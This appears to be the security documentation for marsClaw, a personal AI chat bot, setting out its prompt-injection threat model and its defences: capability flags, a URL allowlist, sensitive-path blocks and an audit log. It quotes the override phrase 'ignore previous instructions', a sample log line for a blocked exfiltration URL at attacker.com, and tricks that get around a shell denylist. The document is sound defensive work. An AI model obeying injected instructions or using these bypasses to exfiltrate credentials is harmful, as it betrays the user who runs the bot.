# Security

This is the canonical security doc for marsClaw. It states the **threat model**, the **architecture that enforces it**, every **config flag with its security meaning**, and an honest list of **residual risks the design does not cover** so you can decide whether they matter for your use.

Short read: marsClaw is a single-process, single-user personal bot. The defensive principle is **"can't prevent injection, so shrink blast radius and log everything"** — the agent is structurally egress-less by default, can only act through a narrow validated surface, and every attempt lands in an append-only audit log.

## The threat we defend against

A **prompt-injected agent**. The bot routinely reads attacker-influenceable text — email bodies via Gmail tools, web pages via WebFetch, search snippets, even chat messages from anyone allowed to message the bot. Any of that content can carry "ignore previous instructions, do X" payloads. We design as though every turn could be hostile.

## Threats we explicitly do **not** claim to defend against

In rough order of risk:

1. **Supply-chain compromise.** The Claude Agent SDK, `googleapis`, every dep in `node_modules` runs in-process as you. A malicious package bypasses every gate. Only kernel/container isolation closes this — see [vs-nanoclaw.md](vs-nanoclaw.md).
2. **The model provider.** Your context goes to Anthropic / Google on every turn. Inherent to using a hosted model.
3. **Host-level compromise.** The bot runs as your user; if your account is compromised, all bets are off.
4. **The model itself misbehaving without injection.** Hallucinated outputs in chat aren't a security event — they're a quality event.

If any of these are your real threat, marsClaw is the wrong tool. Use NanoClaw / a containerised agent.

## Architecture: agent thinks, broker acts

```
    untrusted in →  [ AGENT / "executive" ]      ← no secrets, no shell, no
                            │                       direct egress by default
                            │ requests actions (typed)
                            ▼
                     [ BROKER (MCP server) ]      ← holds Google creds; sole
                      • allowlist (URLs, ...)        path to the outside
                      • mutation gate
                      • append-only audit log
                            │
                            ▼
              Google APIs · web (via researcher) · the user
```

- The MCP server is a separate process from the agent.
- The MCP child env passthrough in [src/providers/claude-sdk.ts](https://github.com/deBilla/marsclaw/blob/main/src/providers/claude-sdk.ts) explicitly **withholds `ANTHROPIC_API_KEY`** from the broker — even the broker only sees what it needs.
- Google refresh tokens live in the macOS Keychain (service `marsclaw`) or `data/secrets/*.txt` (0600) on Linux; both are blocked from the agent's file tools by the sensitive-path guard.

This is enforced by **process boundaries + policy**, not by the kernel. It's strong against the prompt-injection threat (the agent can only act through the broker's validated API). It does not stop host-level compromise.

## The four capability flags

Every meaningful capability is **off by default**. Re-enabling each one explicitly reopens a specific attack surface — the doc tells you which.

| Flag (data/config.json) | Env override | Default | What turning it on costs you |
|---|---|---|---|
| `allow_shell` | `MARSCLAW_ALLOW_SHELL=1` | `false` | The Bash tool re-appears. A denylist can't make shell safe against injection (`cat .e''nv`, `python -c`, `base64` all bypass any pattern). Treat as the most expensive flag. |
| `allow_web` | `MARSCLAW_ALLOW_WEB=1` | `false` | `WebFetch` and `WebSearch` become available. Without an allow-list (next row), `WebFetch` can reach any host — i.e. an exfiltration channel. |
| `allowed_web_domains` | `MARSCLAW_ALLOWED_WEB_DOMAINS=…` | `[]` | When non-empty, `WebFetch` is gated to those hosts (with subdomains). Empty + `allow_web=true` = WebSearch works, but no WebFetch will succeed. |
| `allow_mutating_tools` | `MARSCLAW_ALLOW_MUTATING_TOOLS=1` | `false` | The agent can send mail (`gmail_send`), write Sheets, create calendar events, and call write-style `*_raw` APIs. Until enabled, these refuse with a clear message instead of running. |

The **secure default posture** (all flags off) makes a prompt-injected agent have *no* third-party egress path: shell can't run, web can't fetch, mutations can't act, the channel allow-lists keep replies to the owner. The worst a successful injection can do is make the bot say something wrong to you.

### How to enable web safely

```jsonc
// data/config.json
{
  "allow_web": true,
  "allowed_web_domains": [
    "wikipedia.org",            // matches en.wikipedia.org, simple.wikipedia.org, ...
    "developer.mozilla.org",
    "github.com",
    "stackoverflow.com",
    "stackexchange.com",
    "*.gov.lk",                  // wildcard form is equivalent: "gov.lk" works the same
    "news.ycombinator.com"
  ]
}
```

A bare entry (`wikipedia.org`) matches the apex and any subdomain. The `*.example.com` form is equivalent.

Look-alike domains (`evilwikipedia.org`) do not match. Loopback / non-`http(s)` URLs (`file:///`, `javascript:`) are always rejected by `urlHost()` — they can't sit on the allow-list as a smuggling channel.

## Sender authorisation (per channel)

The agent can only be driven by people on the allow-list. Empty list = accept all (with a per-sender warning logged so you can lock down by copy-pasting the id).

| Channel | Config key | Env override |
|---|---|---|
| WhatsApp | `allowed_jids` | `MARSCLAW_WHATSAPP_ALLOWED_JIDS` |
| Telegram | `allowed_telegram_chats` | `MARSCLAW_TELEGRAM_ALLOWED_CHATS` |
| Slack | `allowed_slack_users` | `MARSCLAW_SLACK_ALLOWED_USERS` |

When the list is non-empty, the channel handler drops messages from anyone not listed before they reach the agent loop. Logged at `warn` with the rejected id so you can decide to allow.

## Sensitive paths — off-limits regardless of `allowed_paths`

The following are blocked from the agent's file tools (`Read`/`Write`/`Edit`/`Glob`/`Grep`/`MultiEdit`/`NotebookEdit`) and from `send_file` *even when they sit inside an allowed root*. Source of truth: [src/lib/sensitive-paths.ts](https://github.com/deBilla/marsclaw/blob/main/src/lib/sensitive-paths.ts).

- `.env` — channel tokens, Google OAuth client id/secret.
- `data/config.json` — permission config (self-escalation surface).
- `data/secrets/` — Linux refresh-token fallback.
- `data/whatsapp-auth/` — Baileys session credentials.
- `data/marsclaw.db` — chat history.
- `~/.claude.json` and `~/.claude/` — Claude Code OAuth, session transcripts.
- `~/.gemini/` — Gemini CLI credentials.

### Grep / Glob recursion gate

The per-target sensitive check above only validates a tool's *root* argument; recursive tools (`Grep`, `Glob`) walk into subdirectories past that point. To close this, the gate additionally refuses any `Grep`/`Glob` whose root *contains* a sensitive subtree — for example, you can't `Grep({path: '/Users/you/marsclaw'})` because `.env` is under it. The agent has to narrow the search to a subdirectory that doesn't straddle a sensitive path (`src/`, `wiki/`, etc.).

A related quiet bypass closed at the same time: `Grep`/`Glob` without an explicit `path` argument used to default to the bot process's cwd, silently sidestepping `allowed_paths`. The default is now materialised before any gate runs.

## Web research via the `researcher` subagent

When `allow_web` is on, the executive **delegates page reads to a `researcher` subagent** defined via the SDK's `agents` option in [claude-sdk.ts](https://github.com/deBilla/marsclaw/blob/main/src/providers/claude-sdk.ts):

- `tools: ['WebFetch']` — no FS, no MCP, no conversation history.
- Its system prompt instructs it that fetched pages are untrusted and to return a brief answer (not raw page text).
- The executive's persona is updated to treat the researcher's output as quotable reference material, never as instructions.

This is the "empty room" pattern: even if a fetched page tries to hijack the researcher, there are no credentials or files in its context to steal — and the URL allowlist bounds where it can reach. It does **not** fully solve indirect prompt injection (summary poisoning remains theoretically possible); the real backstop is that the executive itself has no dangerous capability to misuse when its other flags are off.

## Audit log

Every tool decision — allow, deny, or `blocked` (mutation gate refusal) — is appended as one JSON line to `logs/audit.log` by [src/lib/audit-log.ts](https://github.com/deBilla/marsclaw/blob/main/src/lib/audit-log.ts). Override the path with `MARSCLAW_AUDIT_LOG`.

Each record:

```jsonc
{
  "ts": "2026-05-28T10:11:12.345Z",
  "pid": 24135,
  "tool": "WebFetch",                          // or "Bash", "mcp__marsclaw__gmail_send", ...
  "decision": "deny",                          // "allow" | "deny" | "blocked"
  "layer": "url-allowlist",                    // which gate decided
  "subject": "https://attacker.com/?leak=...", // redacted hint (URL / file path / command preview)
  "reason": "host not in allowlist"
}
```

**What this is:** a local, append-only forensic trail. If you ever suspect something happened, you can answer "what did the agent try to do, and what did each gate block?"

**What it isn't:** tamper-resistant against host-level compromise. Same disk, same user. A real tamper-evident audit needs a remote sink (syslog, an external service), which is the point at which you've outgrown a personal bot.

Concurrent writes from the main process and the MCP child are safe — `O_APPEND` is atomic below `PIPE_BUF` (4 KB), which JSON Lines comfortably fit under.

```bash
# Inspect denials in the last day
grep '"decision":"deny"' logs/audit.log | tail
# All mutation-gate blocks
grep '"layer":"mutation-gate"' logs/audit.log
# Everything WebFetch did
grep '"tool":"WebFetch"' logs/audit.log
```

## Why the bot can't approve permission changes from chat

Approval-via-chat (the agent sends "tap yes to allow X" and the user replies "yes") sounds convenient and is a **deliberately omitted feature**. The reasoning matters:

The thing asking for approval is the *potentially-compromised* agent. A hijacked turn composes a persuasive approval message ("Tap yes to finish your request ✅") next to an attacker-controlled URL. The human is now manually auditing an opaque string for encoded exfiltration — exactly where human judgment is weakest. Approval fatigue compounds it.

Instead, when something is blocked, the audit log records it and the agent tells the user the precise `data/config.json` edit + restart needed. Permission changes flow through the operator on a real keyboard, not through a chat reply. That sacrifices polish for a meaningful security property.

## Configuration cheatsheet — three postures

### Locked down (default after fresh install)
Everything off. No third-party egress at all. The bot can still read your Gmail/Drive/Calendar, summarise content for you, run the assistant loop — it just can't act outwardly.

```jsonc
// effectively the defaults — no need to add these unless you want to be explicit
{
  "allow_shell": false,
  "allow_web": false,
  "allow_mutating_tools": false
}
```

### Personal-assistant useful (recommended starting point)
Web on with a tight allow-list, mutations and shell still off. Bot can search and read approved pages; still can't send mail or run shell.

```jsonc
{
  "allow_web": true,
  "allowed_web_domains": ["wikipedia.org", "developer.mozilla.org", "github.com", "stackoverflow.com"]
}
```

### Trusted operator
Mutations on too — the bot can send email, write Sheets, create calendar events. Shell stays off (don't enable unless you really need it).

```jsonc
{
  "allow_web": true,
  "allowed_web_domains": [/* ... */],
  "allow_mutating_tools": true
}
```

## Residual risks (honest list)

In rough order of how much they matter:

1. **Supply chain** — the SDK and every dep run in-process as you. No in-process flag fixes this.
2. **Enabling `allow_shell` reopens the file/credential exfil class.** A denylist cannot make shell safe; this is by design.
3. **Indirect prompt injection in untrusted content** — the researcher subagent and capability-removal mitigate, but a sufficiently clever poisoned summary can still influence the executive's reply.
4. **Audit log is local-only.** A host-compromised attacker can rewrite it. Ship to a remote sink if you need real tamper-evidence.
5. **The model provider sees your context.** Inherent.
6. **`MARSCLAW_TOOL_PERMISSIONS=bypass` disables every gate.** Operator escape hatch; never set it in a running deployment.

## Where the code lives

| Concern | File |
|---|---|
| Tool permission gate (FS, shell, web, audit hooks) | [src/lib/tool-permissions.ts](https://github.com/deBilla/marsclaw/blob/main/src/lib/tool-permissions.ts) |
| Sensitive-path list + `pathContainsSensitive` | [src/lib/sensitive-paths.ts](https://github.com/deBilla/marsclaw/blob/main/src/lib/sensitive-paths.ts) |
| URL allow-list (host matching, look-alike defence) | [src/lib/url-allowlist.ts](https://github.com/deBilla/marsclaw/blob/main/src/lib/url-allowlist.ts) |
| Mutation gate (gmail_send, *_raw write methods, …) | [src/lib/mutation-gate.ts](https://github.com/deBilla/marsclaw/blob/main/src/lib/mutation-gate.ts) |
| Audit log | [src/lib/audit-log.ts](https://github.com/deBilla/marsclaw/blob/main/src/lib/audit-log.ts) |
| Researcher subagent + persona | [src/providers/claude-sdk.ts](https://github.com/deBilla/marsclaw/blob/main/src/providers/claude-sdk.ts) |
| Telegram / Slack sender allow-lists | [src/channels/telegram.ts](https://github.com/deBilla/marsclaw/blob/main/src/channels/telegram.ts), [src/channels/slack.ts](https://github.com/deBilla/marsclaw/blob/main/src/channels/slack.ts) |
| MCP child env passthrough (no Anthropic creds in broker) | [src/providers/claude-sdk.ts](https://github.com/deBilla/marsclaw/blob/main/src/providers/claude-sdk.ts) `MCP_ENV_PASSTHROUGH` |

For the comparison against the multi-tenant alternative — when in-process is enough vs. when you need a container — see [vs-nanoclaw.md](vs-nanoclaw.md).
